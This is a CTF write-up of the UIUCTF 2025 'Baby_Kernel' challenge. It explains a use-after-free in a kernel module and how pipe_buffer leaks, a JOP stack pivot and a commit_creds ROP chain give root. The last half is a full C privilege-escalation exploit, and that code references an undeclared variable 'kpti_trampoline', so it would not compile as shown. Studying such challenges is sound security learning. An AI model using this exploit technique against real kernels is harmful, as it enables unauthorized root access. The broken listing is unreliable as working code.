# Challenge 
The challenge files can be downloaded here:
https://github.com/sajjadium/ctf-archives/tree/main/ctfs/UIUCTF/2025/pwn/Baby_Kernel

# Starting

This is the first time I am doing a kernel challenge that does not belong to pwn.college

Installing `zstd` and running `$ tar --zstd -xf handout.tar.zst`
Now I have got these files:
```
$ ls
handout  handout.tar.zst
$ cd handout/
$ ls
bzImage  initrd.cpio.gz  run.sh  vuln.c  vuln.ko
```

here is `run.sh`:
```
#! /bin/sh

# Note: -serial mon:stdio is here for convenience purposes.
# Remotely the chal is run with -serial stdio.

qemu-system-x86_64 \
  -no-reboot \
  -cpu max \
  -net none \
  -serial mon:stdio \
  -display none \
  -monitor none \
  -vga none \
  -kernel bzImage \
  -initrd initrd.cpio.gz \
  -append "console=ttyS0" \
```

I am not sure what to do with `initrd.cpio.gz` tho, never seen this file before. I have usually just seens `vmlinux` (and I just do `gdb vmlinux` and `target remote :1234` to debug the entire kernel)

By asking gpt some questions. Turned out to start a kernel challenge, we need to:
1. Extract the filesystem from `initrd.cpio.gz`
2. Extract `vmlinux` from `bzImage`
3. Building solve scripts and moving it to the filesystem and rebuilding it with commands like:
`find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../new_initrd.cpio.gz`

# Babykernel writeup 
The vulnerability in the kernel module (vuln.ko) is UAF (Use After Free)
```
        case FREE: {
            if (!buf) {
                return -EFAULT;
            }
            kfree(buf);
            break;
        }
```
which means when a buffer is freed (deleted), we still have access to it. For example, there might be some memory addresses on the freed object, and since we still have access to the freed object, we might be able to print the addresses.

The main goal of kernel challenges is to gain root privileges and print the flag

## Simple explanation
And the following is what I did:

- allocate a buffer
- free it
- print a useful memory address
- allocate pipe_buffer (a kernel object that contains another kernel address)
- print another useful memory address
- Use the second leaked address to calculate kernel base address
- Once kernel base address is obtained, we have access to JOP/ROP gadgets (basically an instruction ended with `ret` so that we can chain the instructions to achieve something)
- Use a ROP chain to perform `commit_creds(&init_cred)` (basically calling `commit_creds` with the address of `init_cred` as `rdi` so that we get root.
- There is a function pointer on pipe_buffer that gets triggered when we close the pipe. We first overwrite that function pointer with our staring point of our ROP chain, which is a JOP (jump oriented programming) gadget. And then we close the pipe to trigger the ROP chain.
- Root gained!


# Detailed explanation

- allocate a buffer
- free it
- print a useful memory address, let's call this address `A` 
- allocate pipe_buffer (a kernel object that contains another kernel address)
- print another useful memory address, let's call this address `B`
- Use the second leaked address to calculate kernel base address
- Once kernel base address is obtained, we have access to JOP/ROP gadgets (basically an instruction ended with `ret` so that we can chain the instructions to achieve something)
- Use a ROP chain to perform `commit_creds(&init_cred)` (basically calling `commit_creds` with the address of `init_cred` as `rdi` so that we get root.
- There is a function pointer on pipe_buffer that gets triggered when we close the pipe. We first overwrite that function pointer with our staring point of our ROP chain, which is a JOP (jump oriented programming) gadget. And then we close the pipe to trigger the ROP chain.
- Root gained!

## How is address `A` used?

Still remember that we need to overwrite pipe_buffer function pointer to trigger ROP chain?

More specifcally, the execution flow of pipe_buffer when we closed the pipe is like the following:
```
jump to *(pipe_buffer+0x10) + 0x108
```
what if we make it `pipe_buffer+0x10` point to the starting pointer of our buffer:
```
jump to our_buffer + 0x108
```

AND!!! address `A` is contiguous in memory with the address of our buffer (where to write data to), which means I can obtain the my buffer address, so when I overwrite `pipe_buffer+0x10` with that and make `our_buffer+0x108`. It will execute `our_buffer+0x108`!!! Therefore we can hijack the control flow. 

## hijacking control flow

So after we have overwritten `pipe_buffer+0x10` to be the starting point of the buffer to write to, when we close the pipe_buffer, it will execute `our_buffer+0x108`, only once. 

So we need to chain instructions there with a bunch of gadgets.

I am not sure whether SMAP/SMEP were enabled or not so I did it the safe way, also the hard way, which is by using a jump gadget to stack pivot:

Since I have noticed that at the pointer we reached `our_buffer+0x108`, `rsi` is exactly  `our_buffer+0x0`. Therefore, we could stack pivot by:
```
Buffer offset

0x00	: add rsp, 0x48 ; ret
...
0x44	: pop rsp ; ret

...

0x50	: <standard krop chain>

0x108	: push rsi; jmp qword ptr [rsi + 0x44]

```
Execution flow:
```
push rsi; jmp qword ptr [rsi + 0x44] ---> pop rsp ; ret ---> add rsp, 0x48 ; ret --> <standard rop chain>

```
Explanation of the above gadgets
```
push rsi; jmp qword ptr [rsi + 0x44] 

# after this, rsi (our_buffer+0x0) would be on the stack and we jump to rsi+0x44, so we need to place something at offset 0x44

pop rsp ; ret 

# now since what's on top of the stack (rsp) is rsi (our_buffer), pop_rsp pops that into `rsp`, so the stack immediately switches to rsi, we have then pivoted the stack

add rsp, 0x48 ; ret 

# further move the stack downwards by 0x48 bytes to skip the gadget at 0x44, because we are writing to the same payload, we don't want <standard krop chain> to overwrite that
```
 In short, the ROP chain starts with a jump gadget ( gadgets that ends with `jmp` instruction. In most cases, I guess, is `jmp qword ptr [<REGISTER> + <OFFSET>]` with `<REGISTER>` being something we have control of)
 
 it starts with a jump gadget that first do a small setup (push rsi) for stack pivot, and then jump to a ROP gadget that stack pivots immediately to get on `<standard krop chain>`
 
`<standard krop chain>`  being:
```
    u64 *rop = (u64 *)(rop_payload + 0x48 + 8); // offset of standard krop chain as 0x50
    
    *rop++ = pop_rdi;               // pop rdi; ret
    *rop++ = init_cred;             // init_cred address  
    *rop++ = commit_creds;          // commit_creds(&init_cred)
    *rop++ = kernel_base + SWAPGS;  // return to userspace to pop a shell!
    *rop++ = kernel_base + IRETQ;
    
    *rop++ = (u64)get_shell;        // user rip
    *rop++ = user_cs;               // user cs
    *rop++ = user_rflags;           // user rflags
    *rop++ = user_sp;               // user rsp
    *rop++ = user_ss;               // user ss
```

For those who are new to rop and feeling confused, they are gadgets that ends with `ret`, which makes `rip` the instruction pointer to point to the next item on the stack. So for example:
``` 
    *rop++ = pop_rdi;              // ends with a ret!
    *rop++ = init_cred;             
    *rop++ = commit_creds; 
```

`pop rdi ; ret` first pop the top item, in this case, `init_cred` into `rdi`, and then `ret` would make `rip` point to `commit_creds` and then execute it! So that's doing: `commit_creds(&init_cred)` which would get us root privilege

# How is address `B` used

address `B` is the original pointer on `pipe_buffer+0x10`, which looks like something like this:
```
0xffffffffae41ec40
```
and we can use this to calculate the kernel base address to get a bunch of ROP gadgets


# Full exploit:
```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/socket.h>  
#include <sys/types.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define K1_TYPE 0xB9
#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

typedef uint64_t u64;


#define PUSH_RSI_JMP_RSI_44     0xd4ad2a   
#define POP_RSP_RET             0xeadf45   // pop rsp; ret
#define ADD_RSP_0x48_RET	 0xea7e12
#define POP_RDI                 0xeaf204   // pop rdi; ret
#define COMMIT_CREDS            0xb9970   // commit_creds function
#define INIT_CRED               0x1a52fc0   // init_cred symbol
#define SWAPGS 		 0x100180c
#define IRETQ			 0x1001ce6

u64 user_cs, user_ss, user_rflags, user_sp;

int pipes[1000][2];
int trigger_pipes[20][2];  // Pipes for triggering ROP

void save_state() {
    __asm__("movq %%cs, %0" : "=r" (user_cs));
    __asm__("movq %%ss, %0" : "=r" (user_ss));
    __asm__("pushfq; popq %0" : "=r" (user_rflags));
    __asm__("movq %%rsp, %0" : "=r" (user_sp));
}

void get_shell() {
    printf("[+] Got root shell!\n");
    system("/bin/sh");
    exit(0);
}

int spray_pipe_buffers(int count, size_t write_size) {
    char *data = malloc(write_size);
    memset(data, 'A', write_size);
    
    for (int i = 0; i < count; i++) {
        if (pipe(pipes[i]) == -1) {
            perror("pipe");
            return -1;
        }
        
        if (write(pipes[i][1], data, write_size) != write_size) {
            perror("write to pipe");
            return -1;
        }
    }
    
    free(data);
    return 0;
}

int create_trigger_pipes() {
    for (int i = 0; i < 20; i++) {
        if (pipe(trigger_pipes[i]) == -1) {
            perror("pipe for trigger");
            return -1;
        }
        
        // Write some data to allocate pipe_buffer
        char data[0x1000];
        memset(data, 'T', sizeof(data));
        if (write(trigger_pipes[i][1], data, sizeof(data)) != sizeof(data)) {
            perror("write to trigger pipe");
            return -1;
        }
    }
    return 0;
}

void close_trigger_pipes() {
    printf("[+] Closing trigger pipes to execute ROP chain...\n");
    for (int i = 0; i < 20; i++) {
        close(trigger_pipes[i][0]);
        close(trigger_pipes[i][1]);
    }
}

void hexdump(const char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (i % 16 == 0) printf("%04zx: ", i);
        printf("%02x ", (unsigned char)data[i]);
        if (i % 16 == 15) {
            printf(" |");
            for (size_t j = i - 15; j <= i; j++) {
                char c = data[j];
                printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            printf("|\n");
        }
    }
    if (len % 16 != 0) {
        for (size_t i = len % 16; i < 16; i++) printf("   ");
        printf(" |");
        for (size_t i = (len / 16) * 16; i < len; i++) {
            char c = data[i];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("|\n");
    }
}

u64 extract_address(const char *data, size_t offset) {
    if (offset + 8 > 0x800) return 0;
    return *(u64 *)(data + offset);
}

int main(void) {
    printf("[+] Starting UAF exploit with kernel ROP\n");
    

    save_state();
    signal(SIGSEGV, get_shell);
    
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("open /dev/vuln");
        return -1;
    }
    

    size_t size = 1024;
    printf("[+] Allocating buffer of size %zu\n", size);
    if (ioctl(fd, ALLOC, &size) < 0) {
        perror("ALLOC");
        return -1;
    }
    

    char write_data[100];
    strcpy(write_data, "Hello from userspace!");
    
    printf("[+] Writing data to buffer\n");
    if (ioctl(fd, USE_WRITE, write_data) < 0) {
        perror("USE_WRITE");
        return -1;
    }
    char read_data[2048];
    memset(read_data, 0, sizeof(read_data));
    
    printf("[+] Reading data back\n");
    if (ioctl(fd, USE_READ, read_data) < 0) {
        perror("USE_READ");
        return -1;
    }
    
    
    
    printf("[+] Read back: %s\n", read_data);
    
    printf("[+] Freeing buffer (creating UAF)\n");
    if (ioctl(fd, FREE) < 0) {
        perror("FREE");
        return -1;
    }
    
    memset(read_data, 0, sizeof(read_data));
    printf("[+] Attempting to read freed memory (UAF)\n");
    if (ioctl(fd, USE_READ, read_data) < 0) {
        perror("USE_READ after free");
        return -1;
    }
    hexdump(read_data, 2048);
    u64 buffer_leak = extract_address(read_data, 0x200);
    printf("[!] Obscured null ptr: 0x%016llx\n", buffer_leak); 
    
    u64 my_buffer = buffer_leak - 0x400;
    printf("[+] Creating trigger pipes\n");
    if (create_trigger_pipes() < 0) {
        return -1;
    }
    
    memset(read_data, 0, sizeof(read_data));
    printf("[+] Reading memory after pipe spray\n");
    if (ioctl(fd, USE_READ, read_data) < 0) {
        perror("USE_READ after pipe spray");
        return -1;
    }
    
    u64 kernel_leak = extract_address(read_data, 0x10);
    u64 kernel_base = kernel_leak - 0x121ec40;
    printf("[!] Kernel leak: 0x%016llx\n", kernel_leak);
    printf("[!] Kernel base: 0x%016llx\n", kernel_base);
    

    printf("[+] Building JOP->ROP chain...\n");
    
   
    u64 fake_pipe_buffer_addr = my_buffer; 
    
    u64 jop_gadget = kernel_base + PUSH_RSI_JMP_RSI_44;
    u64 pop_rsp_ret = kernel_base + POP_RSP_RET;
    u64 pop_rdi = kernel_base + POP_RDI;
    u64 commit_creds = kernel_base + COMMIT_CREDS;
    u64 init_cred = kernel_base + INIT_CRED;
   
    
    printf("[+] JOP gadget: 0x%llx\n", jop_gadget);
    printf("[+] Stack pivot: 0x%llx\n", pop_rsp_ret);
    printf("[+] Commit creds: 0x%llx\n", commit_creds);
    printf("[+] KPTI trampoline: 0x%llx\n", kpti_trampoline);
    
    
    char rop_payload[1024];
    memset(rop_payload, 0, sizeof(rop_payload));
    
    *(u64 *)(rop_payload + 0x10) = fake_pipe_buffer_addr + 0x100; 
    *(u64 *)(rop_payload + 0x100 + 0x08) = jop_gadget; 
    *(u64 *)(rop_payload + 0x44) = pop_rsp_ret;
    *(u64 *)(rop_payload + 0x00) = kernel_base + ADD_RSP_0x48_RET; 
    u64 *rop = (u64 *)(rop_payload + 0x48 + 8);
    
    *rop++ = pop_rdi;               // pop rdi; ret
    *rop++ = init_cred;             // init_cred address  
    *rop++ = commit_creds;          // commit_creds(init_cred)
    *rop++ = kernel_base + SWAPGS;       // return to userspace
    *rop++ = kernel_base + IRETQ;
     
    *rop++ = (u64)get_shell;        // user rip
    *rop++ = user_cs;               // user cs
    *rop++ = user_rflags;           // user rflags
    *rop++ = user_sp;               // user rsp
    *rop++ = user_ss;               // user ss
    
    // Write ROP payload to freed memory
    printf("[+] Writing ROP payload to freed memory\n");
    if (ioctl(fd, USE_WRITE, rop_payload) < 0) {
        perror("USE_WRITE ROP payload");
        return -1;
    }
    
    printf("[+] ROP chain written, press Enter to trigger...\n");
    getchar();
    
    // Trigger ROP chain by closing pipes
    close_trigger_pipes();
    
    printf("[+] If you see this, the exploit failed\n");
    close(fd);
    return 0;
}
```
